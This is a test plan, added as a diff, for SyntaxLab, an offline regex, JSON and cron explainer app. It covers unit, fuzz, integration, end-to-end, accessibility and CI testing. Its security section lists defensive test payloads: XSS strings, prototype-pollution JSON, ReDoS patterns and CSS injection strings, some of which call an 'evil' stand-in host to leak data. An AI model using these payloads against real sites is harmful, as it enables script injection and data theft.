@@ -1,0 +1,437 @@
+# 13 — Test Plan
+
+**Project:** SyntaxLab
+**Status:** Draft for human review
+**Last updated:** 2026-08-17
+
+---
+
+> **Scope note (Phase 1.5).** **§§1–9 and §§11–13 are V1.0** (regex + JSON). **§10 is V1.1** (cron). Share-URL tests are removed from V1.0 with the feature. Each test group names the milestone that introduces it, so the plan cannot drift from the implementation.
+
+## 1. Strategy
+
+The test pyramid is deliberately bottom-heavy, because the risk in this application is concentrated in pure logic (parsers, explanation, schedule computation) that is cheap to test exhaustively.
+
+```
+         ╱╲          E2E (~25)          user journeys, offline, PWA
+        ╱  ╲         Integration (~60)  editor→parser→explanation, storage
+       ╱    ╲        Component (~80)    rendering, interaction, a11y
+      ╱______╲       Unit (~400)        parsers, explainers, validators
+     ╱________╲      Property/fuzz      generative — the highest-value layer here
+```
+
+The **property/fuzz layer sits outside the pyramid** because it is not a size tier — it is a different kind of assurance. For a tool whose entire job is parsing hostile input, generative testing finds the bugs that example-based tests never will.
+
+### Tests are introduced with their milestone
+
+A test plan that is not tied to milestones becomes a wish-list written at the end. Each group below is introduced by the milestone that creates the code it covers:
+
+| Milestone | Tests introduced |
+|---|---|
+| M1 | Store primitive; smoke render; lint/typecheck gates; **first bundle measurement** |
+| M2 | Worker round trip, timeout → terminate → respawn, superseded responses, malformed payload rejection, `structuredClone` round trip |
+| M3 | Regex tokenizer/parser/explainer units; regex golden corpus; regex property + differential |
+| M4 | Regex component tests; I1–I4; E2; E12; axe on the regex view; render-count assertion |
+| M5 | JSON scanner/parser units; JSONTestSuite conformance; JSON property + differential; prototype-pollution corpus |
+| M6 | JSON component tests; I5–I7; E3; axe on the JSON view; virtualisation performance |
+| M7 | Repository units; I10–I17, I22; storage security; E5; E10 |
+| M8 | Theme validation units; theme-injection corpus; E6; no-flash assertion |
+| M9 | E7, E8, E9; offline analysis for both modes; precache budget |
+| M10 | Full security suite; full axe sweep; screen-reader pass; E17, E18 |
+| M11 | Bundle budgets; Lighthouse gates; long-task audit; memory snapshots |
+| M12 | Full E2E suite; cross-browser; manual checklist |
+| **M14–M16 (V1.1)** | Cron units, golden corpus, refusal tests, DST matrix, property; I8, I9; E4 |
+
+### Tooling
+
+| Layer | Tool | Why |
+|---|---|---|
+| Unit / integration | **Vitest** | Native Vite integration, no separate build config, fast watch |
+| Component | **React Testing Library** | Role-based queries; encourages accessible markup |
+| Property / fuzz | **fast-check** | Mature, shrinking works, integrates with Vitest |
+| E2E | **Playwright** | Real Chromium/Firefox/WebKit, offline emulation, service-worker support |
+| Accessibility | **axe-core** via `@axe-core/playwright` and `jest-axe` | |
+| Performance | **Lighthouse CI** + Playwright PerformanceObserver | |
+| Coverage | **v8** via Vitest | |
+
+---
+
+## 2. Coverage targets
+
+| Area | Line | Branch | Rationale |
+|---|---|---|---|
+| `domain/` | **95%** | **90%** | Pure logic, no excuse for gaps, highest risk |
+| `application/` | 90% | 85% | Use-case orchestration |
+| `infrastructure/` | 85% | 75% | Some browser paths need E2E instead |
+| `features/`, `components/` | 75% | 65% | Diminishing returns on presentational code |
+| **Overall** | **85%** | **80%** | CI gate |
+
+Coverage is a floor, not a goal. A 95%-covered parser with no fuzz testing is less trustworthy than an 80%-covered one backed by differential testing.
+
+**What the suite establishes, stated honestly.** We do not claim to test "all edge cases" — the input space is unbounded and the claim would be unfalsifiable. The suite produces *evidence*:
+
+| Claim | Evidence |
+|---|---|
+| Agrees with the platform on validity | Differential testing across the fuzz corpus, with the corpus size reported in CI |
+| Handles the published JSON conformance suite | JSONTestSuite results, reported per category |
+| Terminates on every corpus input | Step-budget property assertion |
+| Produces the reviewed explanation for these cases | Golden fixtures, human-reviewed on change |
+| Handles these specific hostile inputs | Named security corpus |
+| **Refuses unsupported input clearly** | Refusal tests — see §13.1 |
+
+---
+
+## 3. Unit tests
+
+### 3.1 Regex domain (~150 cases)
+
+**Tokenizer:** every token kind; escapes (`\d \w \s \b \n \x41 A \u{1F600} \cA \0`); char classes including ranges, negation, and nested `-`; all quantifier forms; all group forms; Annex B vs `/u` divergences; unterminated constructs.
+
+**Parser:** precedence (`a|bc` vs `(a|b)c`); nesting depth; group numbering including nested and alternation cases; named groups and duplicates; forward and backward backreferences; error recovery for each recoverable error; the depth limit.
+
+**Explainer:** every AST node type; context sensitivity (`.` at top level / with `s` / in a class; `^` as anchor / negation; `-` as range / literal); flag effects; the golden corpus.
+
+**Golden corpus** — 150+ real patterns with reviewed explanation output:
+```
+^[A-Z][a-z]+$
+^\d{3}-\d{2}-\d{4}$
+(?<year>\d{4})-(?<month>\d{2})-(?<day>\d{2})
+^(?=.*[a-z])(?=.*[A-Z])(?=.*\d).{8,}$
+\b(?:https?|ftp)://[^\s/$.?#].[^\s]*\b
+(?<=\$)\d+(?:\.\d{2})?
+^(?:[a-z0-9!#$%&'*+/=?^_`{|}~-]+(?:\.[a-z0-9!#$%&'*+/=?^_`{|}~-]+)*)@…
+(a+)+$                          ← ReDoS shape, must warn
+\p{Script=Greek}+               ← requires /u
+[\p{L}\p{N}]+                   ← unicode property class
+```
+
+### 3.2 JSON domain (~120 cases)
+
+**Scanner:** all escapes; surrogate pairs; lone surrogates preserved; rejected control characters; every number form valid and invalid; deep nesting; empty containers; whitespace variants including the four legal whitespace characters and no others.
+
+**Parser:** the RFC 8259 conformance suite (the JSONTestSuite corpus — `y_*` must accept, `n_*` must reject, `i_*` documented either way); error recovery; multiple errors; the depth limit; the node limit; duplicate keys; unsafe numbers; key-order preservation with integer-like keys.
+
+**Differential:** for every generated and corpus input, our validity verdict must equal `JSON.parse`'s. Any disagreement is our bug. This single test is worth more than the rest of the JSON suite combined.
+
+**Formatting:** prettify at 2/4/tab; minify; round-trip idempotence; raw number text preserved (`1e5` stays `1e5`); formatting a partially-invalid document does not throw.
+
+### 3.3 Cron domain — **V1.1, ~120 cases**
+
+> Introduced at M14. Not part of the V1.0 suite.
+
+**Field parsing:** every field's range boundaries; names (`JAN`, `mon`, mixed case); lists, ranges, steps, and combinations; `0` and `7` for Sunday; invalid values; inverted ranges; zero/negative steps.
+
+**Refusal tests — as important as the parsing tests.** Unsupported input must be refused clearly, and that behaviour is specified, so it is tested:
+
+| Input | Expected |
+|---|---|
+| `0 0 12 * * ?` (6 fields) | Refusal naming the 5-field format; **no parse attempted**; mentions seconds-first and year conventions |
+| `0 0 12 * * ? 2026` (7 fields) | Refusal |
+| `0 0 L * *` | Refusal naming Quartz |
+| `0 0 15W * *` | Refusal naming Quartz |
+| `0 0 * * 5#3` | Refusal naming Quartz |
+| `H 0 * * *` | Refusal naming Jenkins |
+| `0 0 * *` (4 fields) | "Expected 5 fields, got 4" |
+| `rate(5 minutes)` | Refusal naming AWS EventBridge |
+
+Assertion for every row: the message is specific, no schedule is produced, and **no next-run time is displayed**.
+
+**Schedule computation:** next run for every preset; month and year rollover; leap years across 4/100/400 boundaries; the DOM/DOW OR-rule with an explicit truth table; unsatisfiable schedules terminating with the correct message; the 5-year search bound.
+
+**Timezone — reduced scope (browser-local and UTC only):** UTC has no transitions and is the control case; browser-local is tested with the test runner's TZ pinned to a set of zones, exercising spring-forward skip, fall-back repeat, a southern-hemisphere zone, a half-hour-offset zone (`Asia/Kolkata`), and a no-DST zone. **Named-zone selection is not implemented, so it is not tested** — instead there is a test that no named-zone UI exists.
+
+**Golden corpus** — 100+ expressions with reviewed English output.
+
+### 3.4 Shared and infrastructure
+
+Detection (each type, ambiguous cases, empty, confidence thresholds); limits enforced at all three layers; `Result` helpers; theme validation (valid hex, invalid hex, injection strings, out-of-range numbers, unknown keys); history repository CRUD, query, dedupe, prune, quota, corruption; migrations from every prior fixture; import/export round-trip. **(Share codec tests are removed with the deferred feature.)**
+
+---
+
+## 4. Property and fuzz tests
+
+The highest-value layer. Target: **100 000 generated cases per parser per CI run**, with a fixed seed for reproducibility plus a rotating seed for discovery.
+
+### 4.1 Universal parser properties
+
+```ts
+// Never throws
+fc.assert(fc.property(fc.string({ maxLength: 10_000 }), (s) => {
+  expect(() => parseRegex(s)).not.toThrow();
+}));
+
+// Always terminates within a step budget
+fc.assert(fc.property(fc.string({ maxLength: 10_000 }), (s) => {
+  const { steps } = parseRegexInstrumented(s);
+  expect(steps).toBeLessThan(s.length * 100);
+}));
+
+// Spans are well-formed and properly nested
+fc.assert(fc.property(fc.string(), (s) => {
+  const r = parseRegex(s);
+  if (r.ok) expectValidSpans(r.value.ast, s.length);
+}));
+
+// Differential: we agree with the platform on validity
+fc.assert(fc.property(fc.string({ maxLength: 500 }), (s) => {
+  let native = true; try { new RegExp(s, 'u'); } catch { native = false; }
+  expect(parseRegex(s, { unicode: true }).ok).toBe(native);
+}));
+```
+
+### 4.2 Structured generators
+
+Random strings mostly produce invalid input, which tests only the error paths. Structured generators produce *valid but unusual* input, which is where correctness bugs hide:
+
+- **Regex:** a recursive arbitrary building valid patterns from the grammar — nested groups, alternations, quantifiers, classes, backreferences
+- **JSON:** `fc.jsonValue()` plus a serialiser producing unusual-but-valid formatting (odd whitespace, deep nesting, extreme numbers, escape-heavy strings)
+- **Cron *(V1.1)*:** valid field values composed into 5-field expressions, plus generated 6- and 7-field expressions asserted to be **refused**, never parsed
+
+### 4.3 Round-trip properties
+
+```
+JSON:  parse → format → parse  ⇒ structurally identical
+JSON:  parse → minify → parse  ⇒ structurally identical
+Export:export → import         ⇒ identical entries
+Cron:  parse → toString → parse⇒ identical schedule   (V1.1)
+```
+
+### 4.4 Failure handling
+
+Every counterexample fast-check finds becomes a **permanent named unit test**. The fuzzer finds it once; the regression suite keeps it found.
+
+---
+
+## 5. Integration tests
+
+| # | Flow | Assertions |
+|---|---|---|
+| I1 | Type regex → analysis appears | Debounce respected; worker called once; explanation rendered |
+| I2 | Type invalid regex → error | Error position accurate; editor marker present; no crash |
+| I3 | Regex + test string → matches | Highlights at correct offsets; group values correct |
+| I4 | Catastrophic regex → timeout | Timeout state within ~2 s; UI responsive throughout; worker respawned; the next test works |
+| I5 | Paste JSON → tree | Tree structure matches; paths correct; stats correct |
+| I6 | Invalid JSON → error report | Line/column exact; jump-to-position works |
+| I7 | Format → minify → format | Content preserved |
+| I8 | *(V1.1)* Cron → next runs | Times correct in the selected mode; **zone label on every row**; 6-field input refused |
+| I9 | *(V1.1)* Switch browser-local ↔ UTC | Next runs recompute; labels update |
+| I10 | Analysis → history | Entry created with correct title and metadata |
+| I11 | History → restore | Input restored exactly; analysis recomputes; `lastOpenedAt` updated |
+| I12 | Pause history → analyse | Nothing written |
+| I13 | Theme change → reload | Persisted and applied pre-paint |
+| I14 | Export → clear → import | Entries restored identically |
+| I15 | Quota exceeded | Prune, retry, notify, disable auto-capture |
+| I16 | Storage unavailable | Memory mode; app fully functional; notice shown |
+| I17 | Corrupted records | Quarantined; list still renders |
+| I18 | Worker fails to start | Fallback mode; regex execution disabled with an explanation |
+| I19 | First-run history notice | Appears once, before any save; "Turn history off" disables capture immediately; does not reappear |
+| I20 | Mode switch | Input preserved per mode; correct chunk loaded |
+| I21 | Detection | Suggestion appears; override works; dismissal sticks |
+| I22 | Two tabs | History change propagates via BroadcastChannel |
+
+---
+
+## 6. End-to-end tests
+
+Playwright, against a production build, on Chromium (all), Firefox and WebKit (critical path only).
+
+| # | Journey |
+|---|---|
+| E1 | Open app → empty state → click a regex example → explanation appears |
+| E2 | Full regex journey: type, flags, test string, matches, copy |
+| E3 | Full JSON journey: paste, tree, expand, copy path, format |
+| E4 | *(V1.1)* Full cron journey: preset, timezone switch, next runs, builder, 6-field refusal |
+| E5 | Analyse → open history → restore → verify |
+| E6 | Customise theme → reload → theme persists, **no flash** |
+| E7 | **Offline:** load, go offline, reload, both analyses work (three from V1.1) |
+| E8 | **PWA:** SW registers, precache populated, manifest valid |
+| E9 | Update flow: new SW → banner → no auto-reload → accept → content preserved |
+| E10 | Export → clear → import → verify |
+| E11 | Keyboard-only: complete a full analysis without a mouse |
+| E12 | ReDoS: paste catastrophic pattern → timeout state → UI responsive during |
+| E13 | Oversized input → clean rejection |
+| E14 | Clipboard sharing: copy input, copy explanation, copy JSON path; assert `text/plain` only |
+| E15 | Mobile viewport: tabs work, drawers full-screen, no horizontal scroll |
+| E16 | 200% zoom: no horizontal scroll, everything reachable |
+| E17 | **Network silence:** intercept all requests; assert zero after load |
+| E18 | CSP: assert header; fail on any violation event |
+| E19 | Error boundary: force a panel crash; assert other panels survive and input is preserved |
+| E20 | Reduced motion: assert transitions disabled |
+
+E7, E12, and E17 are the three tests that verify the product's headline claims. If any of them fails, the release does not ship regardless of everything else.
+
+---
+
+## 7. Security tests
+
+Every payload in `tests/security/payloads/` is driven through **every V1.0 input surface**: regex pattern, test subject, JSON body, JSON key, history title, and imported file. Cron fields are added at M14. **Share URLs are not a surface in V1.0.**
+
+### 7.1 XSS
+
+```
+<script>window.__xss=1</script>
+<img src=x onerror="window.__xss=1">
+<svg/onload="window.__xss=1">
+javascript:window.__xss=1
+"><script>window.__xss=1</script>
+<iframe src="javascript:window.__xss=1">
+{{constructor.constructor('window.__xss=1')()}}
+<style>@import 'http://evil'</style>
+<a href="data:text/html,<script>window.__xss=1</script>">
+<script>window.__xss=1</script>
+<div id="x"></div><script>…</script>   ← mXSS-style broken markup
+```
+
+Assertions after each: `window.__xss` is `undefined`; the payload is present as visible **text**; no `<script>` element was created; no CSP violation fired.
+
+### 7.2 Prototype pollution
+
+```json
+{"__proto__": {"polluted": true}}
+{"constructor": {"prototype": {"polluted": true}}}
+{"__proto__": {"toString": "boom"}}
+{"a": {"__proto__": {"polluted": true}}}
+[{"__proto__": {"polluted": true}}]
+```
+Through: JSON parse, import, preference load. Assert `({}).polluted === undefined` and `Object.prototype.polluted === undefined` after each.
+
+### 7.3 ReDoS
+```
+(a+)+$                      with "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!"
+(a|a)*$                     with the same
+([a-zA-Z]+)*$
+(a|b|ab)*c                  with 30 chars
+^(([a-z])+.)+[A-Z]([a-z])+$
+nested {1,1000} repetitions
+```
+Assert: timeout state within ~2.5 s; the main thread stayed responsive (a click during execution is handled); the worker was terminated and respawned; the next execution succeeds.
+
+### 7.4 Oversized and pathological input
+Regex at 10 001 chars; test subject at 1 MB + 1; JSON at 5 MB + 1; JSON nested 501 deep; JSON with 500 001 nodes; a 1 MB single JSON string; a 20 MB + 1 import file. *(A 1 001-char cron expression is added at M14.)* Assert: clean rejection with a specific message; no crash; no hang.
+
+### 7.5 Storage tampering
+Pre-seed IndexedDB with: a record missing required fields; wrong types; `schemaVersion: 99`; a 10 MB input string; a prototype-polluting record; an XSS payload in `title`. Assert: quarantine or safe render; list still works; no crash; no execution.
+
+### 7.6 Theme injection
+```
+--gradient-from: red; background: url(https://evil/?leak=
+#00ff88; } body { display: none } .x {
+expression(alert(1))
+url(javascript:alert(1))
+```
+Assert: rejected by the hex allowlist; defaults applied; no CSS rule created.
+
+### 7.7 Malicious import
+Wrong MIME and extension; a valid JSON file that is not an export; version 999; 100 000 entries; a deeply nested envelope; a prototype-polluting envelope. Assert: specific rejection message; no partial import; no hang.
+
+---
+
+## 8. Accessibility tests
+
+### Automated
+`axe-core` on every primary view and every drawer/dialog, in both contrast modes, at 100% and 200% zoom. **Gate: zero critical or serious violations.** Plus keyboard-only navigation of every flow via Playwright, and a focus-order snapshot test.
+
+### Manual, before release
+| Check | Method |
+|---|---|
+| Screen reader — full flow | NVDA + Firefox; VoiceOver + Safari |
+| Announcement quality | Results announce a useful summary, not token soup; not spammy while typing |
+| Focus management | Drawers/dialogs trap and restore correctly |
+| Editor accessibility | CM6 usable with a screen reader; escape route from the tab trap documented and working |
+| Colour independence | Greyscale screenshot review — all status still legible |
+| Colour-vision deficiency | Deuteranopia/protanopia/tritanopia simulation of the syntax palette |
+| Contrast | Automated check of every default pair, plus the live checker for custom themes |
+| Zoom / reflow | 200% and 400%, 320 px width |
+| Reduced motion | OS setting honoured |
+
+---
+
+## 9. Performance tests
+
+Per `12_PERFORMANCE.md` §8. In CI: bundle budgets, Lighthouse gates, long-task detection, parser microbenchmarks with a 20% regression gate, and the render-count assertion on the typing path.
+
+---
+
+## 10. Compatibility matrix
+
+| Browser | Support | Tested |
+|---|---|---|
+| Chrome/Edge (last 2) | Full | Automated + manual |
+| Firefox (last 2) | Full | Automated + manual |
+| Safari 16.4+ | Full | Automated (WebKit) + manual |
+| Safari 15–16.3 | Degraded: no regex lookbehind in the *engine* — reported as a compatibility note on affected patterns | Manual |
+| Chrome Android | Full | Manual |
+| Safari iOS 16.4+ | Full; storage eviction caveat | Manual |
+| IE / legacy Edge | Unsupported | — |
+
+Feature detection with graceful degradation for: `CompressionStream`, `Intl.supportedValuesOf`, `navigator.storage.persist`, `BroadcastChannel`, `crypto.randomUUID` (a small UUID v4 fallback using `crypto.getRandomValues`), `structuredClone`, `color-mix()`.
+
+---
+
+## 11. CI pipeline
+
+```yaml
+on: [push, pull_request]
+jobs:
+  quality:      # typecheck · eslint · stylelint · prettier --check
+  unit:         # vitest run --coverage  (gate: 85% / 80%)
+  property:     # fast-check, 100k cases, fixed + rotating seed
+  security:     # security suite + npm audit --audit-level=high
+  build:        # production build + bundle budget check
+  e2e:          # playwright (chromium full, firefox/webkit critical)
+  a11y:         # axe on all views  (gate: 0 critical/serious)
+  lighthouse:   # gates: 95/95/95/90 + PWA
+```
+
+**All jobs must pass to merge.** No exceptions, no "fix it in the next PR".
+
+---
+
+## 12. Manual test checklist (pre-release)
+
+```
+[ ] Fresh install, no cached data — first-run experience is coherent
+[ ] Every shipped mode with real-world inputs
+[ ] Offline after first load — every feature
+[ ] Install as a PWA on desktop and Android; launch standalone
+[ ] Update flow in an installed PWA
+[ ] Screen-reader pass on the primary journey
+[ ] Keyboard-only pass
+[ ] 200% zoom
+[ ] Mobile device, real hardware
+[ ] Theme customisation including a deliberately terrible colour choice
+[ ] History with 500 entries — performance and pruning
+[ ] Import a hostile file by hand
+[ ] Devtools: inspect everything written to storage; confirm no surprises
+[ ] Network tab: confirm zero requests after load
+[ ] Security header review on the deployed preview
+```
+
+---
+
+## 13. What testing will not catch
+
+Stated so nobody mistakes a green pipeline for correctness:
+
+- **Explanation quality.** Tests assert the explanation *matches the golden file*. Whether it is *good* is a human judgement, reviewed on every golden-file change.
+- **Design and feel.** No test knows the UI looks cheap.
+- **Cron semantics vs a specific scheduler** *(V1.1)*. We test our documented dialect, not parity with any particular implementation — and we say so in the UI.
+- **Novel browser bugs.** Especially in service workers and IndexedDB.
+- **Supply-chain compromise.** `npm audit` finds known issues, not new ones.
+- **Whether the product is useful.** That needs users.
+
+---
+
+## 13.1 Refusal is specified behaviour, and is tested as such
+
+Where SyntaxLab deliberately does not support something, the correct behaviour is a **clear refusal with a useful message** — not a best-effort attempt. That is a feature with acceptance criteria, so it has tests:
+
+| Deliberate non-support | Refusal test | Criterion |
+|---|---|---|
+| Non-ECMAScript regex constructs | Each row of the dialect table produces its specific corrective hint | R-18, R-19 |
+| Non-5-field cron *(V1.1)* | Each unsupported dialect produces a message naming the scheduler it comes from | C-7 to C-11 |
+| JSON5 / JSONC syntax | Trailing commas, comments, single quotes each produce a dialect-aware hint | J-20 |
+| Named timezones *(V1.1)* | No named-zone UI exists; the standing scope note is present | C-6, C-23 |
+| Oversized input | Rejected before parsing, with the actual size shown | S-7 |
+
+A refusal that is vague ("invalid input") fails these tests just as surely as a wrong parse would.
